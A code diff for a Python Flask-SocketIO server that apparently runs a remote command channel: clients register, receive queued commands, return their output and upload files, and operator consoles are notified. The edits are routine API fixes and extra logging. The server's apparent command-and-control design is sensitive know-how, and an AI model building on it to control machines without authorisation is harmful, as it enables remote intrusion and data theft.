@@ -287,7 +287,7 @@ def handle_disconnect():
             del client_sockets[client_id]
             print(f"[-] Client disconnected: {client_id}")
             # Notify consoles
-            socketio.emit('client_offline', {'client_id': client_id}, broadcast=True)
+            socketio.emit('client_offline', {'client_id': client_id}, namespace='/')
             break
 
 @socketio.on('register')
@@ -331,7 +331,7 @@ def handle_register(data):
         'client_id': client_id,
         'hostname': data.get('hostname'),
         'platform': data.get('platform')
-    }, broadcast=True)
+    }, namespace='/')
     
     # Send any pending commands
     if client_id in pending_commands and pending_commands[client_id]:
@@ -354,6 +354,9 @@ def handle_result(data):
     cmd_id = data.get('command_id')
     client_id = data.get('client_id')
     
+    print(f"[*] Result received: {cmd_id} from {client_id}")
+    print(f"    Output length: {len(data.get('output', ''))} chars")
+    
     # Store result
     command_results[cmd_id] = {
         'command_id': cmd_id,
@@ -361,13 +364,15 @@ def handle_result(data):
         'command': data.get('command', ''),
         'output': data.get('output', ''),
         'success': data.get('success', True),
+        'status': data.get('status', 'completed'),
         'timestamp': time.time()
     }
     
-    print(f"[*] Result received: {cmd_id} from {client_id}")
+    # Notify all consoles immediately (no broadcast param, namespace='/' means all)
+    socketio.emit('command_result', command_results[cmd_id], namespace='/')
     
-    # Notify consoles
-    socketio.emit('command_result', command_results[cmd_id], broadcast=True)
+    # Also notify specific client room
+    socketio.emit('result_ready', command_results[cmd_id], room=client_id, namespace='/')
 
 @socketio.on('file_download')
 def handle_file_download(data):
@@ -391,7 +396,7 @@ def handle_file_download(data):
             'file_id': file_id,
             'filename': filename,
             'size': len(file_bytes)
-        }, broadcast=True)
+        }, namespace='/')
 
 @socketio.on('console_connect')
 def handle_console_connect(data):
